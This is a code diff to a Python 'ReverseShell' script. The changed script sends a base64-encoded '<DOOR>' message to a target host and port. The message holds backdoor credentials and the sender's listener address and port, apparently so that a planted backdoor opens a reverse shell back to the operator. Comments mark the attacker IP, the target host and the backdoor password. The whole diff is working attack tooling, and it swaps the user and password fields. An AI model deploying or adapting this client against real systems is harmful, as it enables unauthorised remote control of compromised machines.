@@ -1,5 +1,6 @@
 import base64
 import socket
+import time
 
 class ReverseShell:
     def __init__(self, 
@@ -26,41 +27,37 @@ class ReverseShell:
     
     def run(self):
         
-        s = False
-        if s:
-            payload = "<DOOR><PASS>{Pass}</PASS><USER>{user}</USER><HOST>{lhost}</HOST><PORT>{lport}</PORT></DOOR>".format(
-                    Pass = self.session_user,
-                    user = self.session_pass,
-                    lhost = self.lhost,
-                    lport = self.lport
-                    )
-            self.sock.sendto(self.encode_base64(payload),(self.rhost, self.rport))
-        else:
-            payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
-         
-            self.sock.sendto(bytes(payload, "utf-8"),(self.rhost, self.rport))
+        payload = "<DOOR><PASS>{Pass}</PASS><USER>{user}</USER><HOST>{lhost}</HOST><PORT>{lport}</PORT></DOOR>".format(
+                Pass = self.session_user,
+                user = self.session_pass,
+                lhost = self.lhost,
+                lport = self.lport)
         
-
+        self.sock.sendto(self.encode_base64(payload),(self.rhost, self.rport))
+        
+        # time for timeout is 4sec.
         self.sock.settimeout(4);
         try:
             r= self.sock.recv(1024)
-            print(r)
+            print("#",self.decode_base64(r))
+
         except Exception as e:
-            print("{}\nrport may not be set correctly".format(e))
+            print("#{}\nrport may not be set correctly".format(e))
             
         self.sock.close()
-        
+         
 
 if __name__ == "__main__":
     
     session = ReverseShell(
-            lhost = "127.0.0.1",
-            lport = 4444,
-            rhost = "127.0.0.1",
-            rport = 41333,
-            session_pass= "test",
-            session_user = "admin")
-     
+            lhost = "127.0.0.1",    # your ip address
+            lport = 4444,           # your opne port
+            rhost = "127.0.0.1",    # target host 
+            rport = 41333,          # target setting port 
+            session_pass= "admin",  # target door session password
+            session_user = "admin"  # target door session user 
+            )
+    
     session.run()
 
 
